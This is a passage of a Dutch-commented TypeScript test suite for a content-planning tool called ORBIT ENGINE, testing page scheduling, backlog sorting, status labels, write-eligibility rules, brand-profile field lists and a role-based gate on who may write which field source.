  // Binnen dag 1 tot en met 28, zodat februari geen uitzondering is.
  ok("de laatste staat uiterlijk op dag 28", tien[9] === "2026-08-28");
  ok(
    "ze staan oplopend",
    tien.every((d, i) => i === 0 || d > tien[i - 1]),
  );

  // ⚠️ De spreiding hangt af van het AANTAL in de maand en niet van de quota.
  // Zet iemand er drie in, dan horen ze over de maand verdeeld te staan en niet
  // op dag 1, 2 en 3 met drie weken niets erachter.
  const drie = spreadDates("2026-08-12", 1, 3, buitenDeMaand);
  ok("drie pagina's spreiden ook over de hele maand", drie[2] === "2026-08-28");
  ok("de middelste ligt ertussenin", drie[1] > drie[0] && drie[1] < drie[2]);

  ok(
    "één pagina staat op dag 1",
    spreadDates("2026-08-12", 1, 1, buitenDeMaand)[0] === "2026-08-01",
  );
  ok("nul pagina's leveren niets", spreadDates("2026-08-12", 1, 0, buitenDeMaand).length === 0);
  // Februari heeft 28 dagen: geen enkele datum mag daarbuiten vallen.
  ok(
    "februari levert geen 29e of 30e op",
    spreadDates("2026-01-01", 2, 10, buitenDeMaand).every((d) => Number(d.slice(8)) <= 28),
  );
});

group("de lopende maand plant niet in het verleden (plan-schedule)", () => {
  // ⚠️ Gevonden op het scherm van Gasservice Brabant: het plan werd op 25
  // augustus opgesteld met augustus als maand 1, dus negen van de tien pagina's
  // kregen een datum die al geweest was, en bij elke regel stond "Stond gepland
  // voor 1 augustus".
  const opDe25e = new Date("2026-08-25T10:00:00Z");
  const lopend = spreadDates("2026-08-25", 1, 3, opDe25e);
  ok(
    "in de lopende maand begint de spreiding morgen",
    lopend[0] === "2026-08-26",
    `eerste datum was ${lopend[0]}`,
  );
  ok(
    "en geen enkele datum ligt in het verleden",
    lopend.every((d) => d > "2026-08-25"),
  );
  ok("de laatste blijft binnen de maand", lopend[lopend.length - 1] === "2026-08-28");

  // Een latere maand is niet de lopende maand en begint dus gewoon op dag 1.
  const later = spreadDates("2026-08-25", 3, 3, opDe25e);
  ok("een volgende maand begint gewoon op de eerste", later[0] === "2026-10-01");

  // Loopt de maand bijna af, dan is er geen ruimte meer om te spreiden en
  // schuiven ze samen op de laatste bruikbare dag. Beter dan een datum in het
  // verleden.
  const bijnaVoorbij = spreadDates("2026-08-27", 1, 3, new Date("2026-08-27T10:00:00Z"));
  ok(
    "aan het eind van de maand blijft alles binnen dag 28",
    bijnaVoorbij.every((d) => d >= "2026-08-28" && d <= "2026-08-28"),
    bijnaVoorbij.join(", "),
  );
});

group("één melding voor de hele maand (plan-overview)", () => {
  // ⚠️ De aanleiding: bij elk van de tien regels van maand 1 stond dezelfde
  // oranje zin. Dat is een eigenschap van de maand, niet van de regel.
  ok(
    "delen alle regels dezelfde melding, dan is het er één",
    sharedNotice(["Maand nog niet vrijgegeven", "Maand nog niet vrijgegeven"]) ===
      "Maand nog niet vrijgegeven",
  );
  // ⚠️ Alleen bij unanimiteit: geldt hij voor negen van de tien, dan verhuist er
  // een mededeling naar de kop die voor één regel niet klopt.
  ok(
    "wijkt er één af, dan blijft alles per regel staan",
    sharedNotice(["Maand nog niet vrijgegeven", "Start eerst de meting"]) === null,
  );
  ok(
    "een regel zonder melding telt mee als afwijking",
    sharedNotice(["Maand nog niet vrijgegeven", null]) === null,
  );
  ok("een maand zonder meldingen geeft niets", sharedNotice([null, null]) === null);
  ok("een lege maand geeft niets", sharedNotice([]) === null);
});

group("een maand opnieuw nummeren en dateren (plan-schedule)", () => {
  const rijen = [
    { id: "a", sort_order: 0, scheduled_for: "2026-08-01", status: "gepland" },
    { id: "b", sort_order: 1, scheduled_for: "2026-08-15", status: "gepland" },
    { id: "c", sort_order: 2, scheduled_for: "2026-08-28", status: "gepland" },
  ];
  // Zelfde reden als hierboven: een vaste `now` buiten de geteste maand.
  const buiten = new Date("2027-06-15T12:00:00Z");
  ok(
    "een lijst die al klopt levert geen enkele update",
    resequenceMonth("2026-08-12", 1, rijen, buiten).length === 0,
  );

  // Er is er één uit de maand gehaald: de twee die overblijven horen opnieuw
  // over de maand verdeeld te worden, niet op dag 1 en dag 15 te blijven staan.
  const naEruit = resequenceMonth("2026-08-12", 1, [rijen[0], rijen[2]], buiten);
  ok("na het weghalen van het middelste schuift de rest op", naEruit.length === 1);
  ok(
    "en de laatste komt op dag 28 uit",
    naEruit.find((u) => u.id === "c")?.scheduled_for === "2026-08-28",
  );

  // ⚠️ Een geplaatste pagina houdt zijn datum: die datum is de werkelijkheid
  // geworden, en hem verzetten zou liegen over wanneer er iets live ging.
  const metLive = resequenceMonth(
    "2026-08-12",
    1,
    [
      { id: "a", sort_order: 5, scheduled_for: "2026-08-03", status: "geplaatst" },
      { id: "b", sort_order: 6, scheduled_for: null, status: "gepland" },
    ],
    buiten,
  );
  const live = metLive.find((u) => u.id === "a");
  ok("een geplaatste pagina houdt zijn publicatiedatum", live?.scheduled_for === "2026-08-03");
  ok("maar krijgt wél zijn nieuwe plek in de nummering", live?.sort_order === 0);

  // ⚠️ Migratie 0067. Dit is de regel die de hele functie bruikbaar maakt voor
  // een zelfgekozen datum: zonder hem is "zet hem op 18 augustus, want dan is de
  // beurs" één sleepbeweging later weer weg.
  const metEigenDatum = resequenceMonth(
    "2026-08-12",
    1,
    [
      { id: "a", sort_order: 0, scheduled_for: "2026-08-01", status: "gepland" },
      {
        id: "b",
        sort_order: 1,
        scheduled_for: "2026-08-18",
        status: "gepland",
        scheduled_manual: true,
      },
      { id: "c", sort_order: 2, scheduled_for: "2026-08-28", status: "gepland" },
    ],
    buiten,
  );
  ok(
    "een zelfgekozen datum overleeft het herplannen van de maand",
    metEigenDatum.every((u) => u.id !== "b"),
  );
});

group("mag deze pagina op deze dag (plan-schedule)", () => {
  // Een plan dat op 12 augustus 2026 startte: maand 1 is augustus, maand 3 is
  // oktober. "Nu" ligt vast op 5 augustus, anders verandert de uitkomst van
  // "die dag is al voorbij" elke dag mee.
  const nu = new Date("2026-08-05T12:00:00Z");

  ok(
    "een dag in de eigen maand mag",
    datumProbleem("2026-08-12", 1, "2026-08-18", nu) === null,
  );
  ok("vandaag mag ook", datumProbleem("2026-08-12", 1, "2026-08-05", nu) === null);
  ok(
    "gisteren niet, want schrijven duurt tien dagen",
    datumProbleem("2026-08-12", 1, "2026-08-04", nu) !== null,
  );
  ok(
    "de 31e mag, ook al plant de spreiding zelf tot 28",
    datumProbleem("2026-08-12", 1, "2026-08-31", nu) === null,
  );
  ok(
    "een dag buiten de maand niet",
    (datumProbleem("2026-08-12", 1, "2026-09-01", nu) ?? "").includes("augustus 2026"),
  );
  ok(
    "en de melding noemt de maand waar hij wél in hoort",
    (datumProbleem("2026-08-12", 3, "2026-08-20", nu) ?? "").includes("oktober 2026"),
  );
  ok("onzin is geen datum", datumProbleem("2026-08-12", 1, "morgen", nu) !== null);
  ok(
    "de 30e februari bestaat niet, en rolt hier niet stilletjes door naar maart",
    datumProbleem("2026-08-12", 7, "2027-02-30", nu) === "Dat is geen geldige datum.",
  );
});

group("de voorraad filteren en sorteren (plan-backlog)", () => {
  const items = [
    kans({ id: "1", title: "Onderhoudscontract vergelijken", potentie: 40 }),
    kans({ id: "2", title: "Oudere ketels", cluster: "Cv-ketel storing", potentie: 80 }),
    kans({ id: "3", title: "Prijs in Tilburg", handeling: "verbeteren", potentie: null, gewicht: 0.9 }),
    kans({ id: "4", title: "Veiligheidscontrole", potentie: null, gewicht: 0.1 }),
  ];

  const gesorteerd = sortBacklog(items);
  ok("de hoogste potentie staat bovenaan", gesorteerd[0].id === "2");
  ok("daarna de lagere potentie", gesorteerd[1].id === "1");
  // ⚠️ Gemeten weegt zwaarder dan geschat: een kans MET potentiescore gaat altijd
  // voor een kans zonder, ook als die tweede een hoog vraaggewicht heeft.
  ok("een kans zonder potentie zakt eronder", gesorteerd[2].id === "3");
  ok("en daar beslist het vraaggewicht", gesorteerd[3].id === "4");

  ok(
    "zonder filters komt alles door",
    filterBacklog(items, LEGE_BACKLOG_FILTERS).length === 4,
  );
  ok(
    "filteren op cluster",
    filterBacklog(items, { ...LEGE_BACKLOG_FILTERS, cluster: "Cv-ketel storing" }).length === 1,
  );
  ok(
    "filteren op handeling",
    filterBacklog(items, { ...LEGE_BACKLOG_FILTERS, handeling: "verbeteren" }).length === 1,
  );
  ok(
    "zoeken is hoofdletterongevoelig",
    filterBacklog(items, { ...LEGE_BACKLOG_FILTERS, zoek: "TILBURG" }).length === 1,
  );
  // ⚠️ Zoeken kijkt ook in de reden en de clusternaam. Aanbevelingstitels beginnen
  // vaak met hetzelfde werkwoord, en dan neemt zoeken op alleen de titel niets weg.
  ok(
    "zoeken kijkt ook in de reden",
    filterBacklog([kans({ why: "V5 is een koopklare vraag" })], {
      ...LEGE_BACKLOG_FILTERS,
      zoek: "koopklare",
    }).length === 1,
  );
  ok(
    "zoeken kijkt ook in de clusternaam",
    filterBacklog(items, { ...LEGE_BACKLOG_FILTERS, zoek: "storing" }).length === 1,
  );

  const tellers = clusterCounts(items);
  ok("de clusterteller telt per cluster", tellers.length === 2);
  ok(
    "en klopt",
    tellers.find((c) => c.naam === "Cv-ketel onderhoud")?.aantal === 3,
  );
});

group("wat er op een voorraadkaart komt te staan (plan-backlog)", () => {
  // ⚠️ Conventie 3: bij een onbekende potentie staat er GEEN getal, ook geen nul.
  // Dit cijfer bepaalt wat iemand als eerste laat schrijven.
  ok("geen potentie is geen label", potentieLabel(kans({ potentie: null })) === null);
  ok("nul is wél een getal", potentieLabel(kans({ potentie: 0 })) === "potentie 0");
  ok("en wordt afgerond", potentieLabel(kans({ potentie: 62.4 })) === "potentie 62");

  ok(
    "de noemer staat erbij als hij bekend is",
    raaktLabel(kans({ raakt: 4, gemeten: 30 })) === "raakt 4 van de 30 gemeten vragen",
  );
  ok(
    "zonder noemer alleen de teller",
    raaktLabel(kans({ raakt: 4, gemeten: null })) === "raakt 4 gemeten vragen",
  );
  ok(
    "enkelvoud bij één vraag",
    raaktLabel(kans({ raakt: 1, gemeten: null })) === "raakt 1 gemeten vraag",
  );
  ok("geen doelvragen is geen regel", raaktLabel(kans({ raakt: null })) === null);
  ok("nul doelvragen ook niet", raaktLabel(kans({ raakt: 0, gemeten: 30 })) === null);
});

group("de twee constanten van het plan", () => {
  ok("een plan kijkt twaalf maanden vooruit", MONTHS_AHEAD === 12);
  ok("en er zijn vier standaard funnelfasen", DEFAULT_FUNNELS.length === 4);
});

group("de drie statustalen (plan-status)", () => {
  // ⚠️ Nova's vondst: dezelfde toestand in drie talen. Een klant die
  // "ter_goedkeuring" ziet weet niet of hij moet wachten of iets moet doen.
  ok(
    "elke status heeft een label én een 'wie is er aan zet'",
    Object.values(PLAN_STATUS_META).every(
      (m) => m.label.length > 2 && m.running.length > 2,
    ),
  );
  ok(
    "wachten op akkoord vraagt een handeling van de klant",
    PLAN_STATUS_META.ter_goedkeuring.actionRequired === true &&
      PLAN_STATUS_META.ter_goedkeuring.whoseTurn === "klant",
  );
  // Zonder CMS-koppeling zet een mens de pagina live. Dat is de stap waar dit
  // programma stilvalt als niemand hem ziet, dus hij telt mee als handeling.
  ok(
    "goedgekeurd vraagt óók nog iets: iemand moet hem plaatsen",
    PLAN_STATUS_META.goedgekeurd.actionRequired === true,
  );
  ok(
    "geplaatst vraagt niets meer",
    PLAN_STATUS_META.geplaatst.actionRequired === false &&
      PLAN_STATUS_META.geplaatst.whoseTurn === null,
  );

  const nu = new Date("2026-09-10T12:00:00Z");
  const basis = { scheduled_for: null as string | null, posted_at: null as string | null };

  // De derde laag: wannéér. Bij een pagina die op akkoord wacht hangt de datum
  // van de klant af, en dan is een belofte eerlijker dan een datum.
  ok(
    "wachtend op akkoord noemt geen datum",
    planRunningDate({ ...basis, status: "ter_goedkeuring" }, nu) ===
      "Publiceert zodra je akkoord geeft",
  );
  ok(
    "morgen heet morgen",
    planRunningDate({ ...basis, status: "gepland", scheduled_for: "2026-09-11" }, nu) ===
      "Morgen gepland",
  );
  ok(
    "over een week telt in dagen",
    planRunningDate({ ...basis, status: "gepland", scheduled_for: "2026-09-17" }, nu) ===
      "Over 7 dagen",
  );
  ok(
    "ver weg krijgt een datum in plaats van een aantal dagen",
    (planRunningDate({ ...basis, status: "gepland", scheduled_for: "2026-12-01" }, nu) ?? "").startsWith(
      "Gepland voor",
    ),
  );
  ok(
    "een gemiste datum wordt als zodanig benoemd",
    (planRunningDate({ ...basis, status: "gepland", scheduled_for: "2026-09-01" }, nu) ?? "").startsWith(
      "Stond gepland",
    ),
  );

  ok("drie wachten op de klant", countActionRequired([
    { status: "ter_goedkeuring" },
    { status: "goedgekeurd" },
    { status: "ter_goedkeuring" },
    { status: "gepland" },
    { status: "geplaatst" },
  ]) === 3);
});

group("wanneer ORBIT ENGINE begint te schrijven", () => {
  const nu = new Date("2026-09-10T12:00:00Z");
  const gepland = (datum: string) => ({ status: "gepland" as const, scheduled_for: datum });

  // Nova schrijft ongeveer tien dagen vóór de publicatiedatum.
  ok("tien dagen vooruit is de grens", SCHRIJFVOORSPRONG_DAGEN === 10);
  ok(
    "precies op de grens begint hij",
    shouldStartWriting(gepland("2026-09-20"), true, nu) === true,
  );
  ok(
    "een dag te vroeg nog niet",
    shouldStartWriting(gepland("2026-09-21"), true, nu) === false,
  );

  // ⚠️ De belangrijkste regel van deze module. Elke pagina kost geld, en een
  // afgewezen maand die tóch geschreven is, is weggegooid budget.
  ok(
    "nooit schrijven voor een niet-goedgekeurde maand",
    shouldStartWriting(gepland("2026-09-11"), false, nu) === false,
  );
  ok(
    "en niet nog een keer als hij al geschreven is",
    shouldStartWriting({ status: "geplaatst", scheduled_for: "2026-09-11" }, true, nu) === false,
  );
  ok(
    "een pagina zonder datum wordt nooit opgepakt",
    shouldStartWriting({ status: "gepland", scheduled_for: null }, true, nu) === false,
  );
});

group("mag ORBIT ENGINE deze pagina schrijven? (plan-writing)", () => {
  const nu = new Date("2026-09-10T12:00:00Z");
  const pagina = (over: Partial<PageForWriting> = {}): PageForWriting => ({
    status: "gepland",
    scheduled_for: "2026-09-15",
    is_buffer: false,
    topic_id: "t1",
    ...over,
  });
  const gemeten = { analysis_id: "a1", analysis_status: "gereed" as const };

  const goed = writeDecision(pagina(), "goedgekeurd", gemeten, nu);
  ok("een gemeten onderwerp binnen het venster mag", goed.schrijven === true);
  ok(
    "en levert de analyse waarop geschreven wordt",
    goed.schrijven === true && goed.analysisId === "a1",
  );

  // ⚠️ De duurste regel: elke pagina kost geld.
  ok(
    "een niet-goedgekeurde maand blokkeert alles",
    besluitReden(writeDecision(pagina(), "ter_goedkeuring", gemeten, nu)) ===
      "maand_niet_goedgekeurd",
  );

  // ⚠️ HET GEVAL DAT DEZE MODULE BESTAANSRECHT GEEFT, gemeten op productie:
  // Van den Udenhout heeft acht onderwerpen en twee daarvan zijn ooit als
  // analyse gestart. Zes van de tien pagina's in maand 1 kunnen dus niet
  // geschreven worden, en een cron die dat stil overslaat laat ze een jaar op
  // "Gepland" staan.
  ok(
    "een onderwerp zonder analyse kan niet geschreven worden",
    besluitReden(
      writeDecision(pagina(), "goedgekeurd", { analysis_id: null, analysis_status: null }, nu),
    ) === "geen_analyse",
  );
  ok(
    "en een analyse die nog niet gemeten is ook niet",
    besluitReden(
      writeDecision(
        pagina(),
        "goedgekeurd",
        { analysis_id: "a1", analysis_status: "concept_klaar" },
        nu,
      ),
    ) === "meting_nog_niet_klaar",
  );
  ok(
    "een lopende meting evenmin",
    besluitReden(
      writeDecision(pagina(), "goedgekeurd", { analysis_id: "a1", analysis_status: "meten" }, nu),
    ) === "meting_nog_niet_klaar",
  );
  // 'gemeten' telt wél: de score is binnen, alleen het rapport nog niet.
  ok(
    "een gemeten analyse zonder rapport mag wel",
    writeDecision(pagina(), "goedgekeurd", { analysis_id: "a1", analysis_status: "gemeten" }, nu)
      .schrijven === true,
  );

  ok(
    "buiten het venster gebeurt er niets",
    besluitReden(writeDecision(pagina({ scheduled_for: "2026-09-30" }), "goedgekeurd", gemeten, nu)) ===
      "nog_niet_aan_de_beurt",
  );
  ok(
    "een buffer wordt nooit geschreven",
    besluitReden(writeDecision(pagina({ is_buffer: true }), "goedgekeurd", gemeten, nu)) ===
      "is_buffer",
  );
  ok(
    "en een pagina die al onderweg is ook niet nog een keer",
    besluitReden(writeDecision(pagina({ status: "schrijven" }), "goedgekeurd", gemeten, nu)) ===
      "al_onderweg",
  );

  // De meldingen: alleen wat om een handeling vraagt krijgt tekst. Een melding
  // tonen bij iets wat gewoon goed gaat, leert mensen meldingen negeren.
  ok("nog niet aan de beurt is geen melding", writeBlockNotice("nog_niet_aan_de_beurt") === null);
  ok("een buffer ook niet", writeBlockNotice("is_buffer") === null);
  ok(
    "geen analyse is een melding voor de klant",
    writeBlockNotice("geen_analyse")?.whoseTurn === "klant",
  );
  ok(
    "een lopende meting is er een voor ORBIT ENGINE",
    writeBlockNotice("meting_nog_niet_klaar")?.whoseTurn === "orbit_engine",
  );

  // De briefing die met de schrijftaak meegaat.
  const briefing = planBriefing({
    title: "Auto financieren · Oriëntatie",
    pageType: "dienst",
    topicTitle: "Auto financieren",
    funnelLabel: "Oriëntatie",
    monthNumber: 1,
  });
  ok("een dienstpagina wordt een landingspagina", briefing.type === "landing");
  ok("een informatieve pagina wordt een artikel", contentTypeFor("informatief") === "article");
  ok("de fase staat in het doelpubliek", briefing.targetIntent.includes("oriëntatie"));
  ok("en het onderwerp in de reden", briefing.why.includes("Auto financieren"));
});

/** Leest de reden uit een afwijzende beslissing. Geeft "" bij een toewijzing. */
function besluitReden(d: ReturnType<typeof writeDecision>): string {
  return d.schrijven ? "" : d.reden;
}

group("het merkprofiel als veldenlijst (brand-fields)", () => {
  // ⚠️ Eén feit heeft één eigenaar. Deze test bewaakt dat er geen tweede veld
  // bijkomt dat hetzelfde betekent als een bestaand veld: dat is precies hoe
  // twee kolommen uit elkaar gaan lopen.
  const sleutels = BRAND_FIELDS.map((f) => f.key);
  ok("geen dubbele velden", new Set(sleutels).size === sleutels.length);

  // ⚠️ HET VANGNET DAT ÉÉN ECHTE BUG VING, 10 augustus 2026.
  //
  // `proof_points` stond in de wizard en niet in de lijst van bewerkbare velden
  // van de PATCH-route. De route negeerde dat veld dan zonder fout: de klant
  // vulde zijn bewijspunten in, kreeg "opgeslagen" te zien, en de waarde was weg.
  // Conventie 1: twee lijsten die hetzelfde moeten zeggen is een intentie, één
  // gedeelde lijst met deze test eromheen is een garantie.
  const nietOpslaanbaar = sleutels.filter(
    (k) => !(EDITABLE_PROFILE_FIELDS as readonly string[]).includes(k as string),
  );
  ok(
    `elk wizardveld is opslaanbaar${nietOpslaanbaar.length ? " (mist: " + nietOpslaanbaar.join(", ") + ")" : ""}`,
    nietOpslaanbaar.length === 0,
  );
  ok(
    "geen dubbele velden in de bewerkbare lijst",
    new Set(EDITABLE_PROFILE_FIELDS).size === EDITABLE_PROFILE_FIELDS.length,
  );

  // ⚠️ 41 IN, 41 UIT. De andere kant op, en dit is de kern van fase 2 van
  // 17 augustus 2026.
  //
  // Tot die ronde stonden er 27 velden in de wizard en 41 in een tweede,
  // platte editor. Die editor is weg, dus een veld dat wél opgeslagen mag
  // worden maar in geen enkele stap staat, is vanaf nu een veld dat de klant
  // nergens meer kan corrigeren. Dat merkt niemand tot de volgende
  // contentronde, want er verschijnt geen foutmelding: het veld is er gewoon
  // niet meer. Vandaar een test die in béide richtingen faalt.
  const zonderStap = (EDITABLE_PROFILE_FIELDS as readonly string[]).filter(
    (k) => !sleutels.includes(k as (typeof sleutels)[number]),
  );
  ok(
    `elk opslaanbaar veld staat in een stap${zonderStap.length ? " (mist: " + zonderStap.join(", ") + ")" : ""}`,
    zonderStap.length === 0,
  );
  // Was 41 tot migratie 0060; sindsdien 56, want de commerciële laag (12) en de
  // contactpersoon (3) staan er sinds onboarding 3.0 fase 1 bij.
  ok(
    `het zijn er 56 aan beide kanten (nu ${BRAND_FIELDS.length} en ${EDITABLE_PROFILE_FIELDS.length})`,
    BRAND_FIELDS.length === 56 && EDITABLE_PROFILE_FIELDS.length === 56,
  );

  ok(
    "elk veld hoort bij een bestaande stap",
    BRAND_FIELDS.every((f) => STEP_ORDER.includes(f.step)),
  );
  ok("negen stappen", STEP_ORDER.length === 9);
  // De verdeling van 17 augustus 2026 (`docs/logbook.md`). Staat hier voluit zodat
  // een veld dat naar een andere stap verhuist een bewuste wijziging is en geen
  // stille verschuiving.
  const perStap = STEP_ORDER.map((s) => `${s}:${fieldsOfStep(s).length}`).join(" ");
  ok(
    `de verdeling is 8-3-6-6-5-7-6-12-3 (nu ${perStap})`,
    perStap ===
      "bedrijf:8 merk:3 klant:6 stem:6 woorden:5 auteur:7 bekend:6 strategie:12 contact:3",
  );
  ok(
    "elke stap heeft velden",
    STEP_ORDER.every((s) => fieldsOfStep(s).length > 0),
  );

  // Nova geeft élk veld drie lagen uitleg: label, omschrijving, voorbeeld. De
  // eerste twee zijn hier verplicht; een placeholder heeft alleen zin bij een
  // veld waar je iets in typt.
  ok(
    "elk veld heeft een label en een omschrijving",
    BRAND_FIELDS.every((f) => f.label.length > 2 && f.description.length > 10),
  );
  ok(
    "elke schuif en keuze heeft benoemde standen",
    BRAND_FIELDS.filter((f) => f.kind === "schuif" || f.kind === "keuze").every(
      (f) => (f.options?.length ?? 0) >= 2,
    ),
  );
  // De vijfde schuif is de enige met vier standen, net als bij Nova.
  const lading = BRAND_FIELDS.find((f) => f.key === "tone_emotional");
  ok("de emotionele lading heeft vier standen", lading?.options?.length === 4);

  // ⚠️ Een `keuze` slaat een wóórd op dat in een database-constraint staat, geen
  // nummer. Loopt de waardenlijst niet gelijk met de labels, dan kiest de klant
  // "Lokaal" en komt er "landelijk" in de database, of weigert de insert en
  // ziet hij alleen "opslaan is niet gelukt".
  const keuzes = BRAND_FIELDS.filter((f) => f.kind === "keuze");
  ok("er zijn keuzevelden", keuzes.length === 4);
  ok(
    "elke keuze heeft evenveel waarden als standen",
    keuzes.every((f) => f.values?.length === f.options?.length),
  );
  ok(
    "en geen enkele schuif heeft waarden (die slaan hun nummer op)",
    BRAND_FIELDS.filter((f) => f.kind === "schuif").every((f) => f.values === undefined),
  );
  ok(
    "de waarden van het bedrijfsmodel staan in de constraint van migratie 0032",
    BRAND_FIELDS.find((f) => f.key === "business_model")?.values?.join() ===
      "dienstverlener,retailer,platform,fabrikant,overig",
  );
  ok(
    "en die van het bereik in die van service_scope",
    BRAND_FIELDS.find((f) => f.key === "service_scope")?.values?.join() ===
      "lokaal,landelijk,internationaal",
  );
  ok(
    "de aanspreekvorm kent dezelfde drie waarden als de PATCH-route",
    BRAND_FIELDS.find((f) => f.key === "pronoun_preference")?.values?.join() === "je,u,wij",
  );

  // ── isFilled: per soort betekent "gevuld" iets anders ────────────────────
  ok("een lege string telt niet", isFilled("") === false);
  ok("spaties tellen ook niet", isFilled("   ") === false);
  ok("tekst telt wel", isFilled("iets") === true);
  ok("een lege lijst telt niet", isFilled([]) === false);
  ok("een gevulde lijst telt wel", isFilled(["a"]) === true);
  ok("null telt niet", isFilled(null) === false);
  // De schuiven lopen vanaf 1, dus 0 bestaat niet en betekent "niet ingesteld".
  ok("0 telt niet", isFilled(0) === false);
  ok("1 telt wel", isFilled(1) === true);

  // ── Voortgang ────────────────────────────────────────────────────────────
  const leeg = {};
  ok(
    "een leeg profiel heeft nul gevulde velden",
    overallProgress(leeg).gevuld === 0,
  );
  // ⚠️ De noemer is de KLANTLIJST en niet de hele catalogus. De commerciële laag
  // en de contactpersoon zijn per definitie niet af te leiden uit een website;
  // telden ze standaard mee, dan zakt elk bestaand merk onder de 80% die
  // `csm-data.ts` gebruikt om te bepalen of een dossier deelbaar is, en staat
  // élk merk eeuwig in "wacht op jouw nakijkwerk".
  const klantVelden = BRAND_FIELDS.filter((f) => CLIENT_STEPS.includes(f.step));
  ok(
    `de noemer is de klantlijst van 41 (nu ${overallProgress(leeg).totaal})`,
    overallProgress(leeg).totaal === klantVelden.length &&
      klantVelden.length === 41,
  );
  ok(
    "de sessie kan alle negen stappen meetellen",
    overallProgress(leeg, SESSION_STEPS).totaal === BRAND_FIELDS.length,
  );
  ok("geen enkele stap is compleet", allStepsIncompleet(leeg));

  const stem = {
    tone_formality: 2,
    tone_energy: 2,
    tone_complexity: 2,
    tone_humor: 1,
    tone_emotional: 2,
    tone_of_voice: "Een ervaren monteur",
  } as never;
  const p = stepProgress(stem, "stem");
  ok("een volledig ingevulde stap is compleet", p.compleet === true);
  ok("en telt al zijn velden", p.gevuld === p.totaal && p.totaal === 6);
  ok(
    "terwijl een andere stap dan nog leeg is",
    stepProgress(stem, "auteur").gevuld === 0,
  );

  function allStepsIncompleet(prof: Record<string, unknown>): boolean {
    return STEP_ORDER.every((s) => !stepProgress(prof, s).compleet);
  }
});

group("drie oppervlakken, één veldenlijst (onboarding 3.0 fase 1)", () => {
  // ⚠️ Samen exact `STEP_ORDER`, niets meer en niets minder. Een stap die in
  // geen van beide lijsten staat is een stap die nergens rendert, en dat merkt
  // niemand: er verschijnt geen foutmelding, de velden zijn er gewoon niet.
  const samen = [...CLIENT_STEPS, ...SESSION_STEPS];
  ok(
    "elke stap staat in minstens één oppervlak",
    STEP_ORDER.every((s) => samen.includes(s)),
  );
  ok(
    "en geen enkel oppervlak kent een stap die niet bestaat",
    samen.every((s) => STEP_ORDER.includes(s)),
  );
  ok("de sessie toont alles", SESSION_STEPS.length === STEP_ORDER.length);

  // ⚠️ De enige plek waar de twee oppervlakken bewust verschillen. "Waar wil je
  // op groeien" is een gesprek, geen invulveld dat een klant alleen invult, en
  // de contactpersoon gaat over ons en niet over zijn merk.
  ok("de klant ziet de commerciële laag niet", !CLIENT_STEPS.includes("strategie"));
  ok("en de contactpersoon ook niet", !CLIENT_STEPS.includes("contact"));
  ok("de sessie ziet ze allebei wel", SESSION_STEPS.includes("strategie") && SESSION_STEPS.includes("contact"));
  ok("de klantwizard houdt zijn zeven stappen", CLIENT_STEPS.length === 7);

  // Elke stap heeft een eigen titel en uitleg, ook de twee nieuwe. Nova geeft
  // per blok een `nav.*Subtitle` die zegt waaróm het blok bestaat; zonder dat
  // is een blok van twaalf lege velden een ondervraging.
  ok(
    "elke stap heeft een titel en een uitleg",
    STEP_ORDER.every(
      (s) => STEP_META[s].title.length > 2 && STEP_META[s].description.length > 15,
    ),
  );

  // De commerciële laag is per definitie niet af te leiden uit een website.
  // Staat er één op `derivable: true`, dan meldt de gatenlijst hem als iets wat
  // ORBIT ENGINE nog moet vinden, en dat gaat nooit gebeuren.
  const commercieel = BRAND_FIELDS.filter(
    (f) => f.step === "strategie" || f.step === "contact",
  );
  ok("het zijn er vijftien", commercieel.length === 15);
  ok(
    "en geen enkele is af te leiden",
    commercieel.every((f) => !f.derivable),
  );

  // Een `keuze` slaat een woord op dat in een database-constraint staat.
  ok(
    "de waardeklasse staat in de constraint van migratie 0060",
    BRAND_FIELDS.find((f) => f.key === "deal_value_band")?.values?.join() ===
      "onbekend,klein,midden,groot",
  );
  // `janee` slaat een boolean op, dus geen `values`: dat zou een woord opslaan
  // in een booleaanse kolom en de insert laten weigeren.
  const janee = BRAND_FIELDS.filter((f) => f.kind === "janee");
  ok("er is één ja-nee-veld", janee.length === 1);
  ok(
    "het heeft twee benoemde standen en geen waardenlijst",
    janee[0]?.options?.length === 2 && janee[0]?.values === undefined,
  );
});

group("wie mag welke herkomst wegschrijven (onboarding 3.0 fase 1)", () => {
  // ⚠️ Zonder deze poort kan een klant zijn eigen invoer als gespreksuitkomst
  // wegschrijven. `filterProtectedFields()` laat alleen `ai` overschrijven, dus
  // die waarde is daarna onaantastbaar voor élke volgende onderzoeksronde.
  const klantPoging = resolveWriteSource({
    requested: "gesprek",
    isStaff: false,
    isOwner: true,
  });
  ok("een klant mag geen gespreksuitkomst schrijven", !klantPoging.ok);
  ok(
    "en krijgt een 403",
    !klantPoging.ok && klantPoging.status === 403,
    klantPoging.ok ? "toegestaan" : String(klantPoging.status),
  );
  ok(
    "consultant mag hij ook niet",
    resolveWriteSource({ requested: "consultant", isStaff: false, isOwner: true }).ok === false,
  );

  // Staf mag alle drie.
  for (const bron of ["klant", "gesprek", "consultant"] as const) {
    const d = resolveWriteSource({ requested: bron, isStaff: true, isOwner: false });
    ok(`staf mag ${bron} schrijven`, d.ok && d.source === bron);
  }

  // Een onbekende waarde is een fout en geen stille terugval: schrijft een
  // scherm ooit "beheerder" mee, dan hoort dat op te vallen in plaats van als
  // klantinvoer te landen.
  const onzin = resolveWriteSource({ requested: "beheerder", isStaff: true, isOwner: false });
  ok("een onbekende bron wordt geweigerd", !onzin.ok);
  ok("met een 400", !onzin.ok && onzin.status === 400);

  // Zonder `bron` blijft het gedrag van vóór onboarding 3.0 staan.
  const eigenaar = resolveWriteSource({ requested: undefined, isStaff: false, isOwner: true });
  ok("de eigenaar schrijft klant", eigenaar.ok && eigenaar.source === "klant");
  const consultantVoorKlant = resolveWriteSource({
    requested: undefined,
    isStaff: true,
    isOwner: false,
  });
  ok(
    "staf op andermans merk schrijft gesprek",
    consultantVoorKlant.ok && consultantVoorKlant.source === "gesprek",
  );
  // ⚠️ Dit is wél nieuw: een accountgenoot met schrijfrecht schreef tot nu
  // `gesprek` weg zonder ooit aan tafel gezeten te hebben.
  const accountgenoot = resolveWriteSource({
    requested: undefined,
    isStaff: false,
    isOwner: false,
  });
  ok(
    "een accountgenoot schrijft klant en geen gesprek",
    accountgenoot.ok && accountgenoot.source === "klant",
  );

  ok("en een consultantwaarde telt als mens", isHumanSet("consultant"));

  // ── Wat de consultant bij het aanmaken invulde ───────────────────────────
  //
  // ⚠️ Alleen wat écht gevuld is. Een leeg veld vastleggen als "door de
  // consultant gezet" blokkeert het onderzoek op een waarde die er niet is, en
